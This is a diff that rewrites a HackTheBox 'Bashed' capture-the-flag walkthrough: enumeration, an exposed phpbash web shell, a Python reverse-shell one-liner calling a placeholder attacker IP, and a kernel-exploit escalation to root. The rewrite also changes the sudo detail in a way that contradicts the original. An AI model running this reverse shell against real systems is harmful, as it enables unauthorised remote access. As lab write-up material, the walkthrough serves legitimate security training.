@@ -1,17 +1,12 @@
----
-title: Bashed
-date: 2020-11-28 21:30:30 +/-TTTT
-categories: [CTF, hackthebox]
-tags: [phpbash, sudo, kernel]
----
+## info
 
-![infocard](/assets/htb/bashed/infocard.png)
+![infocard](media/bashedinfocard.png)
 
-bashed is easy box 
+Bashed is an easy-level box where we exploit a vulnerable web shell to gain access and escalate privileges to root.
 
 ## Enumeration
 
-As always we start with Nmap.
+We begin with an Nmap scan to identify open ports and services.
 
 ```
 Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-21 10:34 CET
@@ -25,36 +20,48 @@ Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-21 10:34 CET
 
   Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
   Nmap done: 1 IP address (1 host up) scanned in 10.27 seconds
-  ```
+```
   
-on the webpage, nothing interesting was found. next we find out directories using ffuf
+The scan reveals a web server running on port 80. Visiting the website, nothing interesting was found. Next, we use ffuf to enumerate directories
 
-![ffuf](/assets/htb/bashed/ffuf.png)
+![ffuf](media/bashedffuf.png)
 
-`/dev` looks interesting let's check out that
+The /dev directory seems intriguing. Navigating to it, we discover a file named phpbash.php.
 
-![dev](/assets/htb/bashed/dev.png)
+![dev](media/basheddev.png)
 
-when we navigate to `phpbash.php` we get shell.
 
-![webshell](/assets/htb/bashed/webshell.png)
 
-## Gaining Shell
+![webshell](media/bashedwebshell.png)
 
-we use python to get reverse shell.
+## Gaining Initial Access
 
-`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
+Accessing phpbash.php provides a web-based shell.
 
-we get shell as www-data.on this box we have two user scriptmanager and arrexel,in arrexel home directory we found user flag
+![webshell](media/bashedwebshell.png)
 
-![user](/assets/htb/bashed/user.png)
 
-## Gaining Root
+To establish a reverse shell, we use the following Python command:
 
-we can run everything as scriptmanager using sudo. so lets first escalate privs to scriptmanager.
+```python
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
 
-When we run `uname` with `-a` flag we see that machine is running outdate kernel version 4.4
-after bit google search we found kernel exploit for this version. but gcc in not installed on box so we have to compile this on our machine and then transfer it to victim.
+This gives us a reverse shell as the www-data user. Upon exploration, we identify two users: scriptmanager and arrexel. The user flag is located in arrexel's home directory.
 
-![root](/assets/htb/bashed/root.png)
+![user](media/basheduser.png)
+
+## Privilege Escalation
+
+The scriptmanager user can execute commands as root using sudo. To escalate privileges, we first switch to scriptmanager.
+
+Next, we run uname -a and discover that the system is using an outdated kernel version: 4.4. After researching, we find a kernel exploit for this version. Since the target machine lacks gcc, we compile the exploit on our attacker machine and transfer it to the target.
+
+Executing the exploit successfully grants root access.
+
+![root](media/bashedroot.png)
+
+## Conclusion
+
+The Bashed box demonstrates how a misconfigured and exposed web shell can lead to initial access. By leveraging a reverse shell and identifying privilege escalation opportunities, such as sudo permissions and kernel vulnerabilities, we successfully gained root access. This highlights the importance of securing web directories and keeping systems up to date to mitigate exploitation risks.
 
